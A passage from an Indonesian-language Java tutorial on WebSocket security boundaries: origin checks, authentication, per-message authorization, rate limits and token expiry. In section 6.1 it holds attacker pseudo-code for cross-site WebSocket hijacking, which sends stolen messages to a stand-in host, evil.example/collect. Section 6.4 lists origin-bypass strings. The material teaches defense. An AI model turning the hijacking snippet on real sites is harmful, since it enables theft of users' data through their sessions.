# learn-java-servlet-websocket-web-container-runtime-part-025

# Part 025 — WebSocket Security Boundary

> Seri: `learn-java-servlet-websocket-web-container-runtime`  
> Bagian: `025` dari `031`  
> Topik: keamanan spesifik WebSocket pada Java/Jakarta runtime  
> Target: engineer yang mampu mendesain, mengaudit, dan mengoperasikan WebSocket endpoint secara aman pada aplikasi Java 8–25, baik `javax.websocket.*` maupun `jakarta.websocket.*`.

---

## 1. Tujuan Bagian Ini

Bagian ini membahas **security boundary khusus WebSocket**.

Kita tidak akan mengulang seluruh materi cryptography, OAuth/OIDC, Spring Security, Jakarta Security, atau authorization framework. Yang kita bahas adalah: ketika aplikasi Java membuka endpoint WebSocket, **apa saja permukaan serangan yang muncul karena koneksi berubah dari HTTP request/response pendek menjadi koneksi full-duplex, stateful, dan long-lived**.

WebSocket bukan sekadar HTTP endpoint dengan transport berbeda. Ia mengubah bentuk masalah keamanan:

```text
HTTP biasa:
  request datang
  server autentikasi + otorisasi
  response dikirim
  request selesai

WebSocket:
  handshake datang
  server menerima koneksi
  koneksi hidup lama
  banyak pesan masuk/keluar
  identitas/otorisasi bisa berubah selama koneksi masih hidup
  client bisa lambat, diam, spam, reconnect, atau ghost
```

Konsekuensinya, security WebSocket harus dipikirkan pada beberapa lapisan:

```text
1. TLS / transport boundary
2. HTTP upgrade handshake boundary
3. Browser origin boundary
4. Authentication boundary
5. Session/token lifetime boundary
6. Per-message authorization boundary
7. Message schema/input validation boundary
8. Rate/concurrency/resource boundary
9. Cluster/proxy/runtime boundary
10. Observability/audit boundary
```

Engineer top-tier tidak bertanya hanya:

> “Endpoint ini sudah pakai token belum?”

Tapi bertanya:

> “Koneksi ini boleh dibuka oleh siapa, dari origin mana, untuk user/resource apa, selama berapa lama, dengan rate berapa, payload seperti apa, di node mana, bagaimana jika role user berubah, bagaimana jika token expired, bagaimana jika tab reconnect 10 kali, bagaimana jika client mengirim 100MB frame, bagaimana audit trail membuktikan pesan mana diproses atas identitas siapa?”

---

## 2. Referensi Konseptual

Materi ini berangkat dari beberapa kontrak resmi dan praktik keamanan umum:

- **RFC 6455 — The WebSocket Protocol**: mendefinisikan handshake, framing, masking, origin considerations, dan security considerations.
- **Jakarta WebSocket 2.2 Specification**: mendefinisikan API endpoint Java untuk WebSocket modern (`jakarta.websocket.*`).
- **Jakarta WebSocket / Javax WebSocket API**: `@ServerEndpoint`, `Session`, `ServerEndpointConfig.Configurator`, encoder/decoder, endpoint lifecycle.
- **OWASP WebSocket Security Cheat Sheet**: praktik umum seperti origin validation, authentication, authorization, input validation, rate limiting, dan protection against CSWSH.

Versi namespace:

```java
// Java EE / legacy
import javax.websocket.*;
import javax.websocket.server.*;

// Jakarta EE / modern
import jakarta.websocket.*;
import jakarta.websocket.server.*;
```

Secara security model, banyak konsepnya sama. Perbedaannya terutama package namespace, container compatibility, dan integrasi platform.

---

## 3. Mental Model: WebSocket Security Bukan Sekali Cek di Handshake

Kesalahan paling umum adalah menganggap keamanan WebSocket selesai di handshake.

```text
Handshake accepted = user aman selamanya
```

Ini salah.

Handshake hanya menjawab:

```text
Apakah koneksi ini boleh dibuka sekarang?
```

Tetapi setelah koneksi terbuka, server masih harus menjawab pertanyaan lain:

```text
Apakah pesan ini valid?
Apakah user ini masih boleh melakukan action ini?
Apakah resource target masih accessible?
Apakah role user berubah?
Apakah session/token expired?
Apakah client mengirim terlalu cepat?
Apakah client mengirim payload terlalu besar?
Apakah client dari tab lama setelah logout masih boleh publish event?
Apakah koneksi ini harus ditutup saat account disabled?
```

Karena itu desain WebSocket security harus dipisah menjadi dua gate:

```text
Connection Gate
  - TLS
  - Origin
  - Authentication
  - Initial authorization
  - Protocol/subprotocol validation
  - Connection quota

Message Gate
  - Schema validation
  - Per-message authorization
  - Rate limit
  - Payload limit
  - Idempotency/sequence check
  - Replay/duplicate protection jika diperlukan
  - Audit context
```

Diagram:

```text
Client Browser
    |
    |  HTTP GET Upgrade: websocket
    v
Reverse Proxy / LB
    |
    |  forwarded upgrade request
    v
WebSocket Container
    |
    |  Configurator.modifyHandshake / checkOrigin
    v
Connection Gate
    |
    |  accepted
    v
Open WebSocket Session
    |
    |  many messages
    v
Message Gate per message
    |
    v
Business handler / broker / domain service
```

---

## 4. Attack Surface WebSocket

WebSocket attack surface berbeda karena beberapa sifat berikut.

### 4.1 Stateful dan Long-Lived

HTTP biasa pendek. WebSocket panjang.

Akibatnya:

- satu koneksi bisa memakan memory lama,
- attacker bisa membuka banyak koneksi idle,
- role user bisa berubah saat koneksi masih hidup,
- session bisa expired saat koneksi masih hidup,
- tab lama bisa tetap terhubung setelah user logout di tab lain,
- rolling deployment harus menutup koneksi lama secara aman.

### 4.2 Full-Duplex

Server dan client bisa saling kirim kapan saja.

Akibatnya:

- authorization bukan hanya pada inbound message, tapi juga outbound event,
- server bisa membocorkan data ke koneksi yang sudah tidak eligible,
- topic subscription harus divalidasi,
- fan-out event harus memfilter audience.

### 4.3 Browser Mengirim Cookie Otomatis

Jika WebSocket memakai cookie session, browser bisa mengirim cookie saat membuka koneksi WebSocket.

Ini nyaman untuk aplikasi first-party, tapi membuka risiko **Cross-Site WebSocket Hijacking (CSWSH)** jika origin tidak divalidasi.

### 4.4 Tidak Ada Built-In Message Semantics

WebSocket hanya transport. Ia tidak tahu:

- command,
- event,
- tenant,
- resource,
- permission,
- message id,
- schema version,
- idempotency,
- business invariant.

Semua itu harus didesain aplikasi.

### 4.5 Resource Exhaustion Lebih Mudah

Karena koneksi persistent:

- banyak koneksi idle bisa menghabiskan file descriptor,
- slow client bisa menahan outbound queue,
- pesan besar bisa menghabiskan heap,
- reconnect storm bisa menghantam CPU/auth service,
- broadcast besar bisa menghantam thread pool.

---

## 5. WebSocket Handshake sebagai Security Boundary

Handshake WebSocket dimulai sebagai HTTP request.

Contoh handshake dari browser:

```http
GET /ws/notifications HTTP/1.1
Host: app.example.com
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==
Sec-WebSocket-Version: 13
Origin: https://app.example.com
Cookie: JSESSIONID=abc123
```

Server menjawab:

```http
HTTP/1.1 101 Switching Protocols
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Accept: s3pPLMBiTxaQ9kYGzzhZRbK+xOo=
```

Setelah `101 Switching Protocols`, koneksi tidak lagi diperlakukan seperti HTTP request/response normal.

Security implications:

1. Banyak mekanisme HTTP biasa hanya bekerja saat handshake.
2. Filter/security middleware mungkin hanya mengamankan handshake, bukan pesan selanjutnya.
3. CSRF token pada form HTTP tidak otomatis berlaku untuk WebSocket message.
4. CORS tidak bekerja sama persis seperti HTTP fetch; WebSocket memiliki `Origin`, tapi server harus memvalidasinya sendiri.
5. Header Authorization bisa dipakai oleh non-browser client, tetapi browser WebSocket API tidak membolehkan arbitrary custom header secara langsung.

---

## 6. Origin Validation dan Cross-Site WebSocket Hijacking

### 6.1 Masalahnya

Cross-Site WebSocket Hijacking terjadi ketika:

1. User login di `https://app.example.com`.
2. Browser menyimpan session cookie.
3. User membuka situs attacker `https://evil.example`.
4. JavaScript attacker membuat WebSocket ke `wss://app.example.com/ws`.
5. Browser otomatis mengirim cookie `app.example.com` pada handshake.
6. Server menerima koneksi karena cookie valid.
7. Attacker dapat mengirim/menunggu pesan melalui browser victim.

Pseudo-code attacker:

```javascript
const ws = new WebSocket("wss://app.example.com/ws/admin");

ws.onopen = () => {
  ws.send(JSON.stringify({ type: "EXPORT_DATA", caseId: "123" }));
};

ws.onmessage = event => {
  fetch("https://evil.example/collect", {
    method: "POST",
    body: event.data
  });
};
```

Jika server hanya mengandalkan cookie dan tidak memvalidasi origin, ini berbahaya.

### 6.2 Kenapa CORS Tidak Cukup

Banyak engineer keliru menganggap CORS otomatis melindungi WebSocket seperti `fetch()`.

Untuk WebSocket browser:

- Browser mengirim header `Origin`.
- Server harus memutuskan apakah origin diterima.
- WebSocket tidak menggunakan preflight CORS yang sama seperti HTTP `fetch` dengan custom header.

Jadi rule utamanya:

```text
Untuk browser-based WebSocket, selalu validate Origin pada handshake.
```

### 6.3 Implementasi Origin Check dengan Configurator

Jakarta WebSocket menyediakan `ServerEndpointConfig.Configurator`.

Contoh sederhana:

```java
package com.example.ws.security;

import jakarta.websocket.server.ServerEndpointConfig;
import java.util.Set;

public class StrictOriginConfigurator extends ServerEndpointConfig.Configurator {

    private static final Set<String> ALLOWED_ORIGINS = Set.of(
        "https://app.example.com",
        "https://admin.example.com"
    );

    @Override
    public boolean checkOrigin(String originHeaderValue) {
        if (originHeaderValue == null || originHeaderValue.isBlank()) {
            return false;
        }
        return ALLOWED_ORIGINS.contains(originHeaderValue);
    }
}
```

Endpoint:

```java
import jakarta.websocket.server.ServerEndpoint;

@ServerEndpoint(
    value = "/ws/notifications",
    configurator = StrictOriginConfigurator.class
)
public class NotificationEndpoint {
    // handlers
}
```

Untuk `javax.websocket.*`, struktur sama, package berbeda.

### 6.4 Origin Validation Harus Exact, Bukan Contains

Jangan begini:

```java
return origin.contains("example.com");
```

Karena ini bisa menerima:

```text
https://example.com.evil.test
https://evil.test/?next=example.com
```

Gunakan exact match terhadap origin canonical:

```text
scheme://host[:port]
```

Contoh valid:

```text
https://app.example.com
https://admin.example.com
```

Contoh tidak valid:

```text
http://app.example.com       // scheme beda
https://evil.example.com     // host beda
https://app.example.com.evil // suffix trick
null                         // jangan diterima untuk app biasa
```

### 6.5 Origin Null

`Origin: null` dapat muncul pada konteks tertentu seperti sandboxed iframe, file origin, atau beberapa environment khusus.

Default aman:

```text
Reject Origin null kecuali ada kebutuhan eksplisit dan kontrol tambahan.
```

---

## 7. Authentication Pattern untuk WebSocket

Ada beberapa pola autentikasi. Tidak ada satu pola yang selalu benar.

### 7.1 Cookie/Session-Based Authentication

Browser otomatis mengirim cookie saat handshake.

Kelebihan:

- nyaman untuk aplikasi web first-party,
- integrasi mudah dengan login session existing,
- tidak perlu expose token ke JavaScript jika cookie `HttpOnly`.

Kelemahan:

- wajib origin validation,
- session fixation/logout edge case,
- session expiration harus disinkronkan dengan koneksi long-lived,
- CSWSH risk jika origin validation lemah,
- sticky session/distributed session bisa menjadi isu.

Cocok untuk:

```text
SPA first-party + same-site WebSocket + session cookie HttpOnly + strict Origin check
```

### 7.2 Bearer Token di Query String

Contoh:

```text
wss://app.example.com/ws?access_token=eyJ...
```

Kelebihan:

- mudah dipakai dari browser WebSocket API,
- tidak tergantung cookie,
- cocok untuk token short-lived khusus WebSocket.

Kelemahan besar:

- query string bisa muncul di log proxy/access log,
- bisa tersimpan di browser history atau monitoring,
- bisa bocor melalui error reporting,
- token replay jika tidak short-lived.

Jika terpaksa memakai query token:

```text
Gunakan token khusus WebSocket, short-lived, single-use jika mungkin, scoped minimal, dan jangan pakai long-lived access token utama.
```

### 7.3 Token di Subprotocol

Browser WebSocket API mengizinkan subprotocol:

```javascript
new WebSocket("wss://app.example.com/ws", ["v1", "token.xxxxx"]);
```

Namun ini juga punya risiko:

- subprotocol bisa masuk log,
- semantik subprotocol menjadi tercampur dengan authentication,
- tidak semua proxy/tooling nyaman,
- perlu implementasi server yang hati-hati.

Umumnya lebih baik hindari kecuali ada alasan kuat.

### 7.4 Token Setelah Connect sebagai First Message

Pola:

1. Handshake hanya menerima origin tertentu.
2. Client mengirim pesan pertama `AUTH` berisi token.
3. Server menandai session authenticated setelah token valid.
4. Semua pesan selain `AUTH` ditolak sebelum authenticated.

Contoh flow:

```text
CONNECT -> OPEN_UNAUTHENTICATED
AUTH(token) -> OPEN_AUTHENTICATED
MESSAGE -> allowed only if authenticated
AUTH timeout -> CLOSE
```

Kelebihan:

- tidak menaruh token di URL,
- lebih fleksibel untuk refresh/re-auth,
- cocok untuk non-cookie app.

Kelemahan:

- koneksi sempat terbuka unauthenticated,
- harus punya timeout sangat pendek,
- semua handler harus enforce state,
- attacker bisa membuat banyak koneksi unauthenticated jika quota tidak ketat.

### 7.5 Custom Header

Non-browser client bisa mengirim:

```http
Authorization: Bearer eyJ...
```

Browser WebSocket API standar tidak mengizinkan arbitrary custom header.

Cocok untuk:

- Java client,
- backend-to-backend WebSocket,
- mobile/native client jika library mendukung.

Tidak cocok sebagai satu-satunya cara untuk browser SPA.

### 7.6 mTLS / Network-Level Auth

Untuk internal backend WebSocket:

- mTLS,
- service mesh identity,
- private network,
- API gateway auth,
- signed service token.

Namun network identity tidak menggantikan application-level authorization.

---

## 8. Handshake Authentication dengan Configurator

`Configurator.modifyHandshake` bisa membaca handshake request/response dan menyimpan authenticated principal/context ke endpoint config user properties.

Contoh konseptual:

```java
package com.example.ws.security;

import jakarta.websocket.HandshakeResponse;
import jakarta.websocket.server.HandshakeRequest;
import jakarta.websocket.server.ServerEndpointConfig;
import java.security.Principal;
import java.util.List;
import java.util.Map;

public class AuthenticatedHandshakeConfigurator extends ServerEndpointConfig.Configurator {

    @Override
    public boolean checkOrigin(String originHeaderValue) {
        return originHeaderValue != null
            && (originHeaderValue.equals("https://app.example.com")
             || originHeaderValue.equals("https://admin.example.com"));
    }

    @Override
    public void modifyHandshake(
        ServerEndpointConfig config,
        HandshakeRequest request,
        HandshakeResponse response
    ) {
        Principal userPrincipal = request.getUserPrincipal();

        if (userPrincipal == null) {
            // Tidak semua container mengizinkan reject langsung dari sini secara portabel.
            // Simpan marker dan tutup di @OnOpen jika tidak valid.
            config.getUserProperties().put("auth.valid", Boolean.FALSE);
            return;
        }

        config.getUserProperties().put("auth.valid", Boolean.TRUE);
        config.getUserProperties().put("principal.name", userPrincipal.getName());
        config.getUserProperties().put("handshake.headers", sanitizeHeaders(request.getHeaders()));
    }

    private Map<String, List<String>> sanitizeHeaders(Map<String, List<String>> headers) {
        // Jangan simpan Authorization/Cookie mentah ke memory/log.
        return Map.of();
    }
}
```

Endpoint:

```java
import jakarta.websocket.CloseReason;
import jakarta.websocket.OnOpen;
import jakarta.websocket.Session;
import jakarta.websocket.server.ServerEndpoint;

@ServerEndpoint(
    value = "/ws/secure",
    configurator = AuthenticatedHandshakeConfigurator.class
)
public class SecureEndpoint {

    @OnOpen
    public void onOpen(Session session) throws Exception {
        Boolean valid = (Boolean) session.getUserProperties().get("auth.valid");
        if (!Boolean.TRUE.equals(valid)) {
            session.close(new CloseReason(
                CloseReason.CloseCodes.VIOLATED_POLICY,
                "Authentication required"
            ));
            return;
        }

        String username = (String) session.getUserProperties().get("principal.name");
        // Register authenticated session
    }
}
```

Catatan penting:

```text
Jangan menganggap semua container/framework memberi behavior identik untuk Principal/session pada WebSocket handshake.
Selalu test pada runtime konkret: Tomcat, Jetty, Undertow/WildFly, Payara, Open Liberty, atau Spring embedded container.
```

---

## 9. Authorization Tidak Boleh Hanya di OnOpen

Handshake authorization menjawab:

```text
Apakah user boleh membuka koneksi ke endpoint ini?
```

Tapi message authorization menjawab:

```text
Apakah user boleh melakukan action ini terhadap resource ini sekarang?
```

Contoh endpoint buruk:

```java
@OnMessage
public void onMessage(String raw, Session session) {
    Command command = parse(raw);
    service.execute(command); // Tidak ada authorization per message
}
```

Endpoint lebih aman:

```java
@OnMessage
public void onMessage(String raw, Session session) {
    AuthContext auth = AuthContext.from(session);
    ClientMessage message = parser.parseAndValidate(raw);

    authorizationService.check(
        auth.userId(),
        message.action(),
        message.resourceType(),
        message.resourceId()
    );

    commandService.execute(auth, message);
}
```

Per-message authorization wajib jika pesan mengandung:

- case id,
- user id target,
- tenant id,
- room id,
- topic name,
- document id,
- workflow action,
- admin command,
- subscription change,
- export request,
- mutation command.

---

## 10. Subscription Security

WebSocket sering memakai pattern subscription:

```json
{
  "type": "SUBSCRIBE",
  "topic": "case:123"
}
```

Jangan percaya topic dari client.

Buruk:

```java
subscriptions.add(session, message.topic());
```

Aman:

```java
String topic = message.topic();
ResourceRef resource = TopicParser.parse(topic);

authorizationService.checkSubscribe(auth.userId(), resource);
subscriptions.add(session, resource.canonicalTopic());
```

Masalah umum:

```text
User boleh connect ke /ws, tapi tidak otomatis boleh subscribe ke semua case/topic.
```

### 10.1 Topic Enumeration

Jika topic mudah ditebak:

```text
case:1
case:2
case:3
```

attacker bisa brute-force subscription.

Mitigasi:

- authorization per subscribe,
- generic error message,
- rate limit failed subscribe,
- audit failed subscribe,
- jangan expose sequential internal id jika tidak perlu,
- gunakan scoped topic derivation server-side.

### 10.2 Server-Derived Subscription

Lebih aman jika client hanya meminta semantic action:

```json
{
  "type": "SUBSCRIBE_MY_CASES"
}
```

Lalu server menentukan topic yang boleh:

```java
List<Topic> topics = authorizationService.findAllowedTopics(auth.userId());
subscriptions.addAll(session, topics);
```

---

## 11. Outbound Authorization: Jangan Hanya Filter Saat Subscribe

Bahaya lain: user awalnya boleh subscribe, lalu permission berubah.

Contoh:

```text
10:00 user A subscribe case:123
10:05 user A role dicabut
10:06 event case:123 dikirim ke user A karena subscription registry masih lama
```

Mitigasi:

1. Re-check authorization saat publish event sensitif.
2. Close session saat role/session revoked.
3. Gunakan short-lived connection/auth lease.
4. Periodic revalidation untuk koneksi panjang.
5. Push revocation event antar node.

Untuk sistem regulatori/case management, outbound authorization sangat penting karena event dapat mengandung:

- case status,
- officer assignment,
- party information,
- document metadata,
- enforcement action,
- correspondence,
- internal notes,
- audit/action feed.

Pattern:

```java
void publishCaseEvent(CaseEvent event) {
    for (WsConnection conn : registry.connectionsForTopic(event.topic())) {
        if (!authorizationService.canReceive(conn.userId(), event.caseId())) {
            registry.removeSubscription(conn, event.topic());
            continue;
        }
        conn.send(event.toMessage());
    }
}
```

Trade-off:

- Re-check per event lebih aman tapi mahal.
- Subscription-time check lebih cepat tapi bisa stale.
- Hybrid sering paling masuk akal:
  - check saat subscribe,
  - re-check untuk event sensitif,
  - revoke on role/session change,
  - TTL lease untuk subscription.

---

## 12. Token Lifetime, Session Expiry, dan Revocation

Long-lived connection menciptakan pertanyaan:

```text
Jika token/session expired setelah WebSocket terbuka, apakah koneksi tetap valid?
```

Jawaban harus eksplisit.

### 12.1 Policy Option A: Validate Only at Handshake

```text
Koneksi valid selama terbuka, walaupun token/session expired setelah handshake.
```

Kelebihan:

- sederhana,
- lebih sedikit disconnect,
- cocok untuk low-risk notification.

Kekurangan:

- buruk untuk data sensitif,
- role revocation lambat,
- logout tidak langsung efektif.

### 12.2 Policy Option B: Connection TTL

```text
Koneksi harus ditutup setelah N menit dan client reconnect dengan credential baru.
```

Contoh:

```text
Max WebSocket auth lease: 15 menit
Client reconnect sebelum expiry
Server close dengan code policy jika expired
```

Kelebihan:

- sederhana,
- membatasi exposure,
- bagus untuk token-based auth.

Kekurangan:

- perlu reconnect handling,
- bisa menciptakan reconnect wave jika TTL seragam.

Mitigasi:

```text
Gunakan jitter pada refresh/reconnect.
```

### 12.3 Policy Option C: Re-Auth Message

Client mengirim token baru sebelum expiry:

```json
{
  "type": "AUTH_REFRESH",
  "accessToken": "..."
}
```

Server update auth context jika valid.

Kelebihan:

- smooth,
- tidak perlu reconnect.

Kekurangan:

- implementasi lebih kompleks,
- token dikirim dalam message,
- harus mencegah downgrade/identity switch.

Rule penting:

```text
AUTH_REFRESH tidak boleh mengubah user identity koneksi ke user lain.
```

Jika token refresh milik user berbeda:

```text
Close connection.
```

### 12.4 Policy Option D: Central Revocation

Ketika user logout/account disabled/role changed:

- update central revocation registry,
- broadcast revocation event ke semua node,
- tutup semua koneksi user/session terkait.

Contoh:

```text
User logout
  -> invalidate HTTP session/token
  -> publish ws-revoke:userId/sessionId
  -> all nodes close matching WebSocket sessions
```

---

## 13. Handling Logout

Logout bukan hanya HTTP endpoint.

Jika aplikasi punya WebSocket aktif:

```text
POST /logout
  -> invalidate HTTP session
  -> delete cookie
  -> close server-side WebSocket sessions for that session/user
  -> client receives close
  -> client redirects to login
```

Tanpa close server-side, tab lama bisa tetap menerima event sampai koneksi mati sendiri.

Registry sebaiknya menyimpan:

```java
record ConnectionIdentity(
    String connectionId,
    String userId,
    String sessionId,
    String tenantId,
    Instant authenticatedAt,
    Instant authExpiresAt
) {}
```

Lalu logout bisa:

```java
registry.closeByHttpSessionId(sessionId, CloseReason.CloseCodes.NORMAL_CLOSURE, "Logged out");
```

---

## 14. Input Validation untuk Message

WebSocket message adalah untrusted input.

Jangan karena channel sudah authenticated, lalu message dipercaya.

Setiap inbound message harus melewati:

```text
1. max payload size
2. valid encoding
3. valid JSON/binary format
4. schema validation
5. allowed message type
6. required fields
7. field constraints
8. canonical resource parsing
9. authorization
10. rate/idempotency rule
```

Contoh message envelope:

```json
{
  "id": "01HR9V2JQ3M6N5V7Y8Z9ABCDEF",
  "type": "CASE_SUBSCRIBE",
  "version": 1,
  "timestamp": "2026-06-17T09:00:00Z",
  "payload": {
    "caseId": "CASE-2026-000123"
  }
}
```

### 14.1 Jangan Dispatch Berdasarkan Class Name dari Client

Buruk:

```json
{
  "class": "com.example.admin.DeleteCaseCommand",
  "payload": { ... }
}
```

Ini membuka risiko deserialization/unsafe dispatch.

Lebih aman:

```json
{
  "type": "CASE_COMMENT_ADD",
  "payload": { ... }
}
```

Server mapping explicitly:

```java
switch (message.type()) {
    case "CASE_COMMENT_ADD" -> handleAddComment(message);
    case "CASE_SUBSCRIBE" -> handleSubscribe(message);
    default -> rejectUnknownType(message.type());
}
```

### 14.2 JSON Parser Hardening

Perhatikan:

- maksimum ukuran payload,
- maksimum depth JSON,
- unknown field policy,
- duplicate field handling,
- numeric overflow,
- date/time parsing,
- Unicode normalization,
- HTML/script content jika akan ditampilkan lagi,
- polymorphic deserialization.

Untuk Jackson, hindari default typing dari untrusted input.

Buruk:

```java
objectMapper.activateDefaultTyping(...); // berbahaya untuk untrusted payload
```

Aman:

```java
objectMapper.disable(DeserializationFeature.FAIL_ON_TRAILING_TOKENS); // sesuai kebutuhan
// Gunakan DTO eksplisit per message type.
```

### 14.3 Binary Message Validation

Jika menerima binary:

- cek format magic header,
- cek size,
- cek compression bomb,
- cek file type,
- cek malware jika file,
- jangan langsung deserialize Java object.

Jangan menerima Java native serialization dari WebSocket client.

---

## 15. Payload Size Limit

Payload limit harus ada di beberapa level:

```text
Browser/client convention
Reverse proxy / ingress
WebSocket container
Endpoint/session config
Application parser
Business rule
```

Pada Jakarta WebSocket, session menyediakan method untuk mengatur buffer size, tergantung API/container:

```java
@OnOpen
public void onOpen(Session session) {
    session.setMaxTextMessageBufferSize(64 * 1024);
    session.setMaxBinaryMessageBufferSize(256 * 1024);
}
```

Jangan terima payload besar tanpa desain streaming. WebSocket bukan default pilihan untuk upload file besar.

Rule praktis:

```text
Command/control message: kecil, misalnya 4KB–64KB.
Real-time event: kecil.
File besar: gunakan HTTP upload/download atau object storage signed URL.
```

Failure jika tidak ada limit:

- heap pressure,
- GC spike,
- OOM,
- slow parse,
- thread starvation,
- log explosion,
- DoS.

---

## 16. Rate Limiting WebSocket

Rate limiting HTTP per request tidak cukup karena setelah upgrade, banyak pesan lewat satu koneksi.

Perlu limit pada:

```text
connections per IP
connections per user
connections per session
unauthenticated connection lifetime
messages per second per connection
messages per second per user
subscription attempts per minute
failed authorization attempts per minute
bytes per second
outbound queue size
broadcast fan-out budget
```

### 16.1 Per-Connection Token Bucket

Contoh sederhana:

```java
public final class TokenBucket {
    private final long capacity;
    private final long refillPerSecond;
    private long tokens;
    private long lastRefillNanos;

    public TokenBucket(long capacity, long refillPerSecond) {
        this.capacity = capacity;
        this.refillPerSecond = refillPerSecond;
        this.tokens = capacity;
        this.lastRefillNanos = System.nanoTime();
    }

    public synchronized boolean tryAcquire(long cost) {
        refill();
        if (tokens < cost) {
            return false;
        }
        tokens -= cost;
        return true;
    }

    private void refill() {
        long now = System.nanoTime();
        long elapsedNanos = now - lastRefillNanos;
        long add = (elapsedNanos * refillPerSecond) / 1_000_000_000L;
        if (add > 0) {
            tokens = Math.min(capacity, tokens + add);
            lastRefillNanos = now;
        }
    }
}
```

Usage:

```java
@OnMessage
public void onMessage(String raw, Session session) throws Exception {
    ConnectionState state = state(session);

    long cost = Math.max(1, raw.length() / 1024);
    if (!state.inboundBucket().tryAcquire(cost)) {
        session.close(new CloseReason(
            CloseReason.CloseCodes.VIOLATED_POLICY,
            "Rate limit exceeded"
        ));
        return;
    }

    handleMessage(raw, session);
}
```

### 16.2 Failed Authorization Rate Limit

Repeated unauthorized messages are signal of probing.

```text
After N unauthorized attempts:
  close connection
  mark user/IP/session suspicious
  audit event
```

### 16.3 Cluster-Wide Limit

Per-node rate limit tidak cukup jika attacker membuka koneksi ke banyak nodes.

Cluster-wide limit bisa memakai:

- Redis atomic counters,
- gateway rate limit,
- service mesh/API gateway,
- broker-side quota,
- application-level distributed quota.

Trade-off:

```text
Per-message Redis check terlalu mahal untuk high-frequency channel.
Gunakan hybrid: local bucket + periodic/global counters untuk abuse detection.
```

---

## 17. Connection Limit dan Admission Control

Sebelum menerima koneksi, server harus mempertimbangkan kapasitas.

Limit yang umum:

```text
max connections per IP
max connections per authenticated user
max connections per tenant
max unauthenticated connections
max total connections per node
max subscriptions per connection
max topics per user
max outbound queue bytes
```

Contoh policy:

```text
Unauthenticated connections:
  max 3 per IP
  auth must complete within 5 seconds

Authenticated user:
  max 5 active WebSocket sessions
  max 100 subscriptions total

Tenant:
  max N connections based on plan/capacity
```

Jika limit dilanggar:

- reject handshake jika bisa,
- atau accept lalu close dengan policy violation,
- jangan biarkan koneksi idle.

### 17.1 Why Admission Control Matters

Tanpa admission control, overload terjadi terlambat:

```text
accept connection
allocate endpoint object
allocate session
register registry
client subscribes many topics
outbound queue grows
heap grows
GC spikes
node killed
all clients reconnect
storm
```

Admission control harus dilakukan sedini mungkin.

---

## 18. Slow Client dan Backpressure sebagai Security Problem

Slow client bukan hanya performance issue. Ia bisa menjadi DoS.

Skenario:

1. Client subscribe ke topic ramai.
2. Client membaca sangat lambat.
3. Server terus enqueue outbound message.
4. Memory naik.
5. Node OOM.

Mitigasi:

```text
bounded outbound queue per connection
max queued bytes
drop policy untuk low-priority event
close slow consumer untuk critical channel
ack-based flow control jika perlu
separate channel untuk high/low priority
```

Contoh state:

```java
record OutboundPolicy(
    int maxQueuedMessages,
    long maxQueuedBytes,
    Duration maxOldestMessageAge
) {}
```

Jika queue penuh:

```text
Option A: close connection
Option B: drop newest
Option C: drop oldest
Option D: coalesce events
Option E: send snapshot-needed signal
```

Untuk regulatory/case management notification, sering lebih baik:

```text
Drop/coalesce notification events, lalu minta client refresh snapshot.
```

Daripada menjamin semua notification event dikirim satu per satu.

---

## 19. Message Integrity dan Replay

WebSocket di atas TLS memberi confidentiality/integrity transport selama koneksi.

Tapi application-level replay/duplicate masih bisa terjadi karena:

- reconnect retry,
- client mengirim ulang command,
- network ambiguity,
- malicious client replay message id,
- tab ganda.

Untuk mutation command, gunakan:

```text
message id / idempotency key
sequence number jika ordering penting
server-side duplicate detection
business invariant
```

Contoh:

```json
{
  "id": "cmd-01J0ABC...",
  "type": "CASE_NOTE_ADD",
  "payload": {
    "caseId": "CASE-2026-000123",
    "text": "..."
  }
}
```

Server:

```java
if (idempotencyStore.alreadyProcessed(auth.userId(), message.id())) {
    sendPreviousResult(session, message.id());
    return;
}

Result result = commandService.execute(message);
idempotencyStore.record(auth.userId(), message.id(), result);
```

Jangan gunakan WebSocket untuk bypass invariant yang sudah ada pada HTTP command API. Jika command critical, pertimbangkan tetap memakai HTTP POST dengan idempotency key, lalu WebSocket hanya untuk progress/event notification.

---

## 20. Authorization Drift dan Stale Connection

Authorization drift terjadi ketika fakta authorization berubah setelah koneksi dibuat.

Contoh:

```text
- user role berubah
- user removed dari tenant
- case assignment berubah
- case sealed/restricted
- account disabled
- session revoked
- policy berubah
```

Mitigasi:

1. Short auth lease.
2. Revalidate on sensitive message.
3. Revalidate on sensitive outbound event.
4. Central revocation event.
5. Close all sessions for affected principal/resource.
6. Subscription TTL.

Pattern subscription TTL:

```text
SUBSCRIBE case:123
  -> valid for 5 minutes
  -> client must renew
  -> renewal rechecks authorization
```

Ini mengurangi stale permission tanpa rechecking setiap event.

---

## 21. Cross-Tenant Boundary

Untuk multi-tenant atau agency/platform system, WebSocket harus membawa tenant context secara aman.

Jangan biarkan client bebas memilih tenant:

```json
{
  "type": "SUBSCRIBE",
  "tenantId": "agency-b",
  "topic": "case:123"
}
```

Jika user session berada di tenant A, message tenant B harus ditolak.

Aman:

```java
TenantId tenant = authContext.tenantId(); // derived from authenticated identity
ResourceRef resource = parseResource(message.payload());

authorization.check(auth.userId(), tenant, resource);
```

Audit harus mencatat:

```text
connectionId
userId
tenantId
sessionId/token id
endpoint
origin
remote IP/proxy chain
message id
action
resource
allow/deny
reason
```

---

## 22. WebSocket dan CSRF Token

CSRF token tradisional biasa digunakan untuk HTTP form/POST.

Untuk WebSocket:

- CSRF token bisa dikirim sebagai query atau first message,
- tetapi jika token bisa dibaca JavaScript attacker, tidak berguna,
- `Origin` validation tetap utama untuk browser CSWSH,
- SameSite cookie membantu tetapi tidak cukup untuk semua scenario.

Pola yang lebih kuat untuk cookie-based WebSocket:

```text
1. Cookie session HttpOnly Secure SameSite=Lax/Strict jika memungkinkan.
2. Strict Origin validation.
3. WebSocket-specific anti-CSWSH nonce jika perlu.
4. Per-message authorization.
```

Anti-CSWSH nonce pattern:

1. App page mendapatkan nonce dari server secara first-party.
2. Nonce disimpan di memory JS, bukan cookie otomatis.
3. Client mengirim nonce saat handshake/query atau first message.
4. Server validasi nonce terhadap session.

Namun hati-hati: jika XSS ada di first-party app, attacker bisa membaca nonce. Jadi nonce bukan pengganti XSS prevention.

---

## 23. SameSite Cookie dan WebSocket

SameSite dapat membantu membatasi cookie pada cross-site context.

Namun jangan jadikan SameSite satu-satunya defense:

- browser behavior bisa berbeda pada edge cases,
- legacy browser atau embedded browser bisa tidak konsisten,
